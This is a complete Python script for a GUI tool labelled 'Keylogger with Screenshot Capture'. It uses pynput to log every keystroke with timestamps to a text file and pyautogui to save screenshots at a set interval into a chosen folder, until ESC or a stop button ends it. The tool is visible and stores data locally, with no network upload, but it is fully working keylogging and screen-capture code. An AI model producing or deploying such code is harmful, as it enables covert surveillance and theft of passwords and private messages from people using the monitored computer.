import tkinter as tk
from tkinter import filedialog, messagebox
from pynput.keyboard import Key, Listener
import pyautogui
import threading
import logging
import time
import os
from datetime import datetime

# === Global variables ===
stop_event = threading.Event()
key_thread = None
screenshot_thread = None
folder_name = ""

# === Logging Functionality ===
def press_key(key):
    try:
        logging.info(str(key))
    except:
        logging.info("Special Key Pressed")

def release_key(key):
    if key == Key.esc:
        stop_event.set()
        return False

def keylogger():
    with Listener(on_press=press_key, on_release=release_key) as listener:
        listener.join()

def screenshot_capture(interval):
    count = 0
    while not stop_event.is_set():
        screenshot = pyautogui.screenshot()
        file_path = os.path.join(folder_name, f"screenshot_{count}.png")
        screenshot.save(file_path)
        count += 1
        time.sleep(interval)

# === GUI Handlers ===
def start_logging():
    global key_thread, screenshot_thread, folder_name

    try:
        interval = int(interval_entry.get())
    except ValueError:
        messagebox.showerror("Invalid Input", "Screenshot interval must be an integer.")
        return

    output_dir = filedialog.askdirectory(title="Select Output Folder")
    if not output_dir:
        return

    timestamp = datetime.now().strftime('%Y-%m-%d_%H-%M-%S')
    folder_name = os.path.join(output_dir, f"logs_{timestamp}")
    os.makedirs(folder_name, exist_ok=True)

    log_path = os.path.join(folder_name, "keystrokes.txt")
    logging.basicConfig(filename=log_path, level=logging.DEBUG, format='%(asctime)s: %(message)s')

    stop_event.clear()
    key_thread = threading.Thread(target=keylogger)
    screenshot_thread = threading.Thread(target=screenshot_capture, args=(interval,))

    key_thread.start()
    screenshot_thread.start()

    status_label.config(text="✅ Logging started. Press ESC to stop.", fg="green")

def stop_logging():
    stop_event.set()
    status_label.config(text="🛑 Logging stopped.", fg="red")

# === GUI Setup ===
window = tk.Tk()
window.title("Keylogger with Screenshot Capture")
window.geometry("400x250")
window.resizable(False, False)

tk.Label(window, text="Screenshot Interval (seconds):").pack(pady=10)
interval_entry = tk.Entry(window)
interval_entry.pack()
interval_entry.insert(0, "10")  # Default value

tk.Button(window, text="Start Logging", command=start_logging, bg="#4CAF50", fg="white").pack(pady=10)
tk.Button(window, text="Stop Logging", command=stop_logging, bg="#f44336", fg="white").pack()

status_label = tk.Label(window, text="Idle", fg="gray")
status_label.pack(pady=20)

window.mainloop()
